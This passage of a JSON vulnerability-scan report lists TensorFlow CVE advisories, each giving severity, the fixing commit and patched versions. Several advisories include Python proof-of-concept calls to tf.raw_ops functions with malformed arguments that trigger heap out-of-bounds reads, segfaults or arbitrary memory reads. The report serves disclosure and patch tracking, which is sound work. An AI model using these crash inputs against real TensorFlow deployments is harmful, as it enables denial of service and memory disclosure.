!= -1) {\n  ...\n  c-\u003eDim(input, axis);\n  ...\n}\n```\n\n### Patches\nWe have patched the issue in GitHub commit [7cf73a2274732c9d82af51c2bc2cf90d13cd7e6d](https://github.com/tensorflow/tensorflow/commit/7cf73a2274732c9d82af51c2bc2cf90d13cd7e6d).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.\n",
                "markdown": "**Vulnerability CVE-2021-41205**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.6.1|[CVE-2021-41205](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41205)|\n\n### Impact\nThe [shape inference functions for the `QuantizeAndDequantizeV*` operations](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/array_ops.cc) can trigger a read outside of bounds of heap allocated array as illustrated in the following sets of PoCs:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  data=tf.raw_ops.QuantizeAndDequantizeV4Grad(\n    gradients=[1.0,1.0],\n    input=[1.0,1.0],\n    input_min=[1.0,10.0],\n    input_max=[1.0,10.0],\n    axis=-100)\n  return data\n\ntest()\n```\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  data=tf.raw_ops.QuantizeAndDequantizeV4(\n    input=[1.0,1.0],\n    input_min=[1.0,10.0],\n    input_max=[1.0,10.0],\n    signed_input=False,\n    num_bits=10,\n    range_given=False,\n    round_mode=`HALF_TO_EVEN`,\n    narrow_range=False,\n    axis=-100)\n  return data\n\ntest()\n```\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  data=tf.raw_ops.QuantizeAndDequantizeV3(\n    input=[1.0,1.0],\n    input_min=[1.0,10.0],\n    input_max=[1.0,10.0],\n    signed_input=False,\n    num_bits=10,\n    range_given=False,\n    narrow_range=False,\n    axis=-100)\n  return data\n\ntest()\n```\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  data=tf.raw_ops.QuantizeAndDequantizeV2(\n    input=[1.0,1.0],\n    input_min=[1.0,10.0],\n    input_max=[1.0,10.0],\n    signed_input=False,\n    num_bits=10,\n    range_given=False,\n    round_mode=`HALF_TO_EVEN`,\n    narrow_range=False,\n    axis=-100)\n  return data\n\ntest()\n```\n\nIn all of these cases, `axis` is a negative value different than the special value used for optional/unknown dimensions (i.e., -1). However, the code ignores the occurences of these values:\n\n```cc\n...\nif (axis != -1) {\n  ...\n  c-\u003eDim(input, axis);\n  ...\n}\n```\n\n### Patches\nWe have patched the issue in GitHub commit [7cf73a2274732c9d82af51c2bc2cf90d13cd7e6d](https://github.com/tensorflow/tensorflow/commit/7cf73a2274732c9d82af51c2bc2cf90d13cd7e6d).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.\n"
              },
              "properties": {
                "security-severity": "7.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-41223",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41223"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41223",
              "help": {
                "text": "Vulnerability CVE-2021-41223\nSeverity: medium\nFixed Version: 2.6.1\nLink: [CVE-2021-41223](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41223)\n### Impact\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/e71b86d47f8bc1816bf54d7bddc4170e47670b97/tensorflow/core/kernels/fused_batch_norm_op.cc#L1292) of `FusedBatchNorm` kernels is vulnerable to a heap OOB:\n\n```python\nimport tensorflow as tf\n    \ntf.raw_ops.FusedBatchNormGrad(\n  y_backprop=tf.constant([i for i in range(9)],shape=(1,1,3,3),dtype=tf.float32)\n  x=tf.constant([i for i in range(2)],shape=(1,1,1,2),dtype=tf.float32)\n  scale=[1,1],\n  reserve_space_1=[1,1],\n  reserve_space_2=[1,1,1],\n  epsilon=1.0,\n  data_format=`NCHW`,\n  is_training=True) \n```\n  \n### Patches\nWe have patched the issue in GitHub commit [aab9998916c2ffbd8f0592059fad352622f89cda](https://github.com/tensorflow/tensorflow/commit/aab9998916c2ffbd8f0592059fad352622f89cda).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-41223**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.6.1|[CVE-2021-41223](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41223)|\n\n### Impact\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/e71b86d47f8bc1816bf54d7bddc4170e47670b97/tensorflow/core/kernels/fused_batch_norm_op.cc#L1292) of `FusedBatchNorm` kernels is vulnerable to a heap OOB:\n\n```python\nimport tensorflow as tf\n    \ntf.raw_ops.FusedBatchNormGrad(\n  y_backprop=tf.constant([i for i in range(9)],shape=(1,1,3,3),dtype=tf.float32)\n  x=tf.constant([i for i in range(2)],shape=(1,1,1,2),dtype=tf.float32)\n  scale=[1,1],\n  reserve_space_1=[1,1],\n  reserve_space_2=[1,1,1],\n  epsilon=1.0,\n  data_format=`NCHW`,\n  is_training=True) \n```\n  \n### Patches\nWe have patched the issue in GitHub commit [aab9998916c2ffbd8f0592059fad352622f89cda](https://github.com/tensorflow/tensorflow/commit/aab9998916c2ffbd8f0592059fad352622f89cda).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-41207",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41207"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41207",
              "help": {
                "text": "Vulnerability CVE-2021-41207\nSeverity: medium\nFixed Version: 2.6.1\nLink: [CVE-2021-41207](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41207)\n### Impact\nThe [implementation of `ParallelConcat`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/inplace_ops.cc#L72-L97) misses some input validation and can produce a division by 0:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  y = tf.raw_ops.ParallelConcat(values=[[`tf`]],shape=0)\n  return y\n\ntest()\n```\n\n### Patches\nWe have patched the issue in GitHub commit [f2c3931113eaafe9ef558faaddd48e00a6606235](https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-41207**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.6.1|[CVE-2021-41207](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41207)|\n\n### Impact\nThe [implementation of `ParallelConcat`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/inplace_ops.cc#L72-L97) misses some input validation and can produce a division by 0:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  y = tf.raw_ops.ParallelConcat(values=[[`tf`]],shape=0)\n  return y\n\ntest()\n```\n\n### Patches\nWe have patched the issue in GitHub commit [f2c3931113eaafe9ef558faaddd48e00a6606235](https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-41208",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41208"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41208",
              "help": {
                "text": "Vulnerability CVE-2021-41208\nSeverity: critical\nFixed Version: 2.6.1\nLink: [CVE-2021-41208](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41208)\n### Impact\nThe [code for boosted trees in TensorFlow](https://github.com/tensorflow/tensorflow/blob/e0b6e58c328059829c3eb968136f17aa72b6c876/tensorflow/core/kernels/boosted_trees/stats_ops.cc) is still missing validation. As a result, attackers can trigger denial of service (via dereferencing `nullptr`s or via `CHECK`-failures) as well as abuse undefined behavior (binding references to `nullptr`s). An attacker can also read and write from heap buffers, depending on the API that gets used and the arguments that are passed to the call.\n\n**Note**: Given that the boosted trees implementation in TensorFlow is unmaintained, it is recommend to no longer use these APIs.  Instead, please use the downstream [TensorFlow Decision Forests](https://github.com/tensorflow/decision-forests) project which is newer and supports more features. We will deprecate TensorFlow`s boosted trees APIs in subsequent releases.\n\n### Patches\nWe have patched the issue in GitHub commit [5c8c9a8bfe750f9743d0c859bae112060b216f5c](https://github.com/tensorflow/tensorflow/commit/5c8c9a8bfe750f9743d0c859bae112060b216f5c).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-41208**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|critical|2.6.1|[CVE-2021-41208](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41208)|\n\n### Impact\nThe [code for boosted trees in TensorFlow](https://github.com/tensorflow/tensorflow/blob/e0b6e58c328059829c3eb968136f17aa72b6c876/tensorflow/core/kernels/boosted_trees/stats_ops.cc) is still missing validation. As a result, attackers can trigger denial of service (via dereferencing `nullptr`s or via `CHECK`-failures) as well as abuse undefined behavior (binding references to `nullptr`s). An attacker can also read and write from heap buffers, depending on the API that gets used and the arguments that are passed to the call.\n\n**Note**: Given that the boosted trees implementation in TensorFlow is unmaintained, it is recommend to no longer use these APIs.  Instead, please use the downstream [TensorFlow Decision Forests](https://github.com/tensorflow/decision-forests) project which is newer and supports more features. We will deprecate TensorFlow`s boosted trees APIs in subsequent releases.\n\n### Patches\nWe have patched the issue in GitHub commit [5c8c9a8bfe750f9743d0c859bae112060b216f5c](https://github.com/tensorflow/tensorflow/commit/5c8c9a8bfe750f9743d0c859bae112060b216f5c).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "8.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "critical"
                ]
              }
            },
            {
              "id": "CVE-2021-41222",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41222"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41222",
              "help": {
                "text": "Vulnerability CVE-2021-41222\nSeverity: medium\nFixed Version: 2.6.1\nLink: [CVE-2021-41222](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41222)\n### Impact\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/e71b86d47f8bc1816bf54d7bddc4170e47670b97/tensorflow/core/kernels/split_v_op.cc#L49-L205) of `SplitV` can trigger a segfault is an attacker supplies negative arguments:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.SplitV(\n  value=tf.constant([]),\n  size_splits=[-1, -2]\n  ,axis=0,\n  num_split=2)\n``` \n  \nThis occurs whenever `size_splits` contains more than one value and at least one value is negative.\n  \n### Patches \nWe have patched the issue in GitHub commit [25d622ffc432acc736b14ca3904177579e733cc6](https://github.com/tensorflow/tensorflow/commit/25d622ffc432acc736b14ca3904177579e733cc6).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-41222**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.6.1|[CVE-2021-41222](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41222)|\n\n### Impact\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/e71b86d47f8bc1816bf54d7bddc4170e47670b97/tensorflow/core/kernels/split_v_op.cc#L49-L205) of `SplitV` can trigger a segfault is an attacker supplies negative arguments:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.SplitV(\n  value=tf.constant([]),\n  size_splits=[-1, -2]\n  ,axis=0,\n  num_split=2)\n``` \n  \nThis occurs whenever `size_splits` contains more than one value and at least one value is negative.\n  \n### Patches \nWe have patched the issue in GitHub commit [25d622ffc432acc736b14ca3904177579e733cc6](https://github.com/tensorflow/tensorflow/commit/25d622ffc432acc736b14ca3904177579e733cc6).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-41227",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41227"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41227",
              "help": {
                "text": "Vulnerability CVE-2021-41227\nSeverity: medium\nFixed Version: 2.6.1\nLink: [CVE-2021-41227](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41227)\n### Impact\nThe `ImmutableConst` operation in TensorFlow can be tricked into reading arbitrary memory contents:\n\n```python\nimport tensorflow as tf\n  \nwith open(`/tmp/test`,`wb`) as f:\n    f.write(b`\\xe2`*128)\n    data = tf.raw_ops.ImmutableConst(dtype=tf.string,shape=3,memory_region_name=`/tmp/test`)\n  \nprint(data)\n```\n  \nThis is because the `tstring` TensorFlow string class has a special case for memory mapped strings but the operation itself does not offer any support for this datatype.\n\n### Patches\nWe have patched the issue in GitHub commit [3712a2d3455e6ccb924daa5724a3652a86f6b585](https://github.com/tensorflow/tensorflow/commit/3712a2d3455e6ccb924daa5724a3652a86f6b585) and GitHub commit [1cb6bb6c2a6019417c9adaf9e6843ba75ee2580b](https://github.com/tensorflow/tensorflow/commit/1cb6bb6c2a6019417c9adaf9e6843ba75ee2580b).\n  \nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-41227**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.6.1|[CVE-2021-41227](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41227)|\n\n### Impact\nThe `ImmutableConst` operation in TensorFlow can be tricked into reading arbitrary memory contents:\n\n```python\nimport tensorflow as tf\n  \nwith open(`/tmp/test`,`wb`) as f:\n    f.write(b`\\xe2`*128)\n    data = tf.raw_ops.ImmutableConst(dtype=tf.string,shape=3,memory_region_name=`/tmp/test`)\n  \nprint(data)\n```\n  \nThis is because the `tstring` TensorFlow string class has a special case for memory mapped strings but the operation itself does not offer any support for this datatype.\n\n### Patches\nWe have patched the issue in GitHub commit [3712a2d3455e6ccb924daa5724a3652a86f6b585](https://github.com/tensorflow/tensorflow/commit/3712a2d3455e6ccb924daa5724a3652a86f6b585) and GitHub commit [1cb6bb6c2a6019417c9adaf9e6843ba75ee2580b](https://github.com/tensorflow/tensorflow/commit/1cb6bb6c2a6019417c9adaf9e6843ba75ee2580b).\n  \nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "6.6",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-41196",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41196"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41196",
              "help": {
                "text": "Vulnerability CVE-2021-41196\nSeverity: medium\nFixed Version: 2.6.1\nLink: [CVE-2021-41196](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41196)\n### Impact\nThe Keras pooling layers can trigger a segfault if the size of the pool is 0 or if a dimension is negative: \n\n```python\nimport tensorflow as tf\n\npool_size = [2, 2, 0]\nlayer = tf.keras.layers.MaxPooling3D(strides=1, pool_size=pool_size)\ninput_tensor = tf.random.uniform([3, 4, 10, 11, 12], dtype=tf.float32)\nres = layer(input_tensor)\n```\n\nThis is due to the TensorFlow`s implementation of pooling operations where the values in the sliding window are not checked to be strictly positive.\n\n### Patches\nWe have patched the issue in GitHub commit [12b1ff82b3f26ff8de17e58703231d5a02ef1b8b](https://github.com/tensorflow/tensorflow/commit/12b1ff82b3f26ff8de17e58703231d5a02ef1b8b) (merging [#51975](https://github.com/tensorflow/tensorflow/pull/51975)).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution \nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/51936).\n",
                "markdown": "**Vulnerability CVE-2021-41196**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.6.1|[CVE-2021-41196](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41196)|\n\n### Impact\nThe Keras pooling layers can trigger a segfault if the size of the pool is 0 or if a dimension is negative: \n\n```python\nimport tensorflow as tf\n\npool_size = [2, 2, 0]\nlayer = tf.keras.layers.MaxPooling3D(strides=1, pool_size=pool_size)\ninput_tensor = tf.random.uniform([3, 4, 10, 11, 12], dtype=tf.float32)\nres = layer(input_tensor)\n```\n\nThis is due to the TensorFlow`s implementation of pooling operations where the values in the sliding window are not checked to be strictly positive.\n\n### Patches\nWe have patched the issue in GitHub commit [12b1ff82b3f26ff8de17e58703231d5a02ef1b8b](https://github.com/tensorflow/tensorflow/commit/12b1ff82b3f26ff8de17e58703231d5a02ef1b8b) (merging [#51975](https://github.com/tensorflow/tensorflow/pull/51975)).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution \nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/51936).\n"
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-41226",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41226"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41226",
              "help": {
                "text": "Vulnerability CVE-2021-41226\nSeverity: medium\nFixed Version: 2.6.1\nLink: [CVE-2021-41226](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41226)\n### Impact\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/e71b86d47f8bc1816bf54d7bddc4170e47670b97/tensorflow/core/kernels/bincount_op.cc#L353-L417) of `SparseBinCount` is vulnerable to a heap OOB:\n\n```python\nimport tensorflow as tf\n  \n  \ntf.raw_ops.SparseBincount(\n  indices=[[0],[1],[2]]\n  values=[0,-10000000]\n  dense_shape=[1,1]\n  size=[1]\n  weights=[3,2,1]\n  binary_output=False)\n```\n\nThis is because of missing validation between the elements of the `values` argument and the shape of the sparse output:\n\n\n```cc\nfor (int64_t i = 0; i \u003c indices_mat.dimension(0); ++i) {\n  const int64_t batch = indices_mat(i, 0);\n  const Tidx bin = values(i);\n  ...\n  out(batch, bin) = ...;\n}\n```\n\n### Patches\nWe have patched the issue in GitHub commit [f410212e373eb2aec4c9e60bf3702eba99a38aba](https://github.com/tensorflow/tensorflow/commit/f410212e373eb2aec4c9e60bf3702eba99a38aba).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-41226**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.6.1|[CVE-2021-41226](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41226)|\n\n### Impact\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/e71b86d47f8bc1816bf54d7bddc4170e47670b97/tensorflow/core/kernels/bincount_op.cc#L353-L417) of `SparseBinCount` is vulnerable to a heap OOB:\n\n```python\nimport tensorflow as tf\n  \n  \ntf.raw_ops.SparseBincount(\n  indices=[[0],[1],[2]]\n  values=[0,-10000000]\n  dense_shape=[1,1]\n  size=[1]\n  weights=[3,2,1]\n  binary_output=False)\n```\n\nThis is because of missing validation between the elements of the `values` argument and the shape of the sparse output:\n\n\n```cc\nfor (int64_t i = 0; i \u003c indices_mat.dimension(0); ++i) {\n  const int64_t batch = indices_mat(i, 0);\n  const Tidx bin = values(i);\n  ...\n  out(batch, bin) = ...;\n}\n```\n\n### Patches\nWe have patched the issue in GitHub commit [f410212e373eb2aec4c9e60bf3702eba99a38aba](https://github.com/tensorflow/tensorflow/commit/f410212e373eb2aec4c9e60bf3702eba99a38aba).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-41221",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41221"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41221",
              "help": {
                "text": "Vulnerability CVE-2021-41221\nSeverity: high\nFixed Version: 2.6.1\nLink: [CVE-2021-41221](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41221)\n### Impact\nThe [shape inference code](https://github.com/tensorflow/tensorflow/blob/9ff27787893f76d6971dcd1552eb5270d254f31b/tensorflow/core/ops/cudnn_rnn_ops.cc) for the `Cudnn*` operations in TensorFlow can be tricked into accessing invalid memory, via a heap buffer overflow:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef func():\n  return tf.raw_ops.CudnnRNNV3(\n    input=[0.1, 0.1],\n    input_h=[0.5],\n    input_c=[0.1, 0.1, 0.1], \n    params=[0.5, 0.5],\n    sequence_lengths=[-1, 0, 1])\n  \nfunc() \n```\n  \nThis occurs because the ranks of the `input`, `input_h` and `input_c` parameters are not validated, but code assumes they have certain values:\n\n```cc\nauto input_shape = c-\u003einput(0);\nauto input_h_shape = c-\u003einput(1);\nauto seq_length = c-\u003eDim(input_shape, 0);\nauto batch_size = c-\u003eDim(input_shape, 1);  // assumes rank \u003e= 2\nauto num_units = c-\u003eDim(input_h_shape, 2); // assumes rank \u003e= 3\n``` \n\n### Patches\nWe have patched the issue in GitHub commit [af5fcebb37c8b5d71c237f4e59c6477015c78ce6](https://github.com/tensorflow/tensorflow/commit/af5fcebb37c8b5d71c237f4e59c6477015c78ce6).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-41221**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.6.1|[CVE-2021-41221](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41221)|\n\n### Impact\nThe [shape inference code](https://github.com/tensorflow/tensorflow/blob/9ff27787893f76d6971dcd1552eb5270d254f31b/tensorflow/core/ops/cudnn_rnn_ops.cc) for the `Cudnn*` operations in TensorFlow can be tricked into accessing invalid memory, via a heap buffer overflow:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef func():\n  return tf.raw_ops.CudnnRNNV3(\n    input=[0.1, 0.1],\n    input_h=[0.5],\n    input_c=[0.1, 0.1, 0.1], \n    params=[0.5, 0.5],\n    sequence_lengths=[-1, 0, 1])\n  \nfunc() \n```\n  \nThis occurs because the ranks of the `input`, `input_h` and `input_c` parameters are not validated, but code assumes they have certain values:\n\n```cc\nauto input_shape = c-\u003einput(0);\nauto input_h_shape = c-\u003einput(1);\nauto seq_length = c-\u003eDim(input_shape, 0);\nauto batch_size = c-\u003eDim(input_shape, 1);  // assumes rank \u003e= 2\nauto num_units = c-\u003eDim(input_h_shape, 2); // assumes rank \u003e= 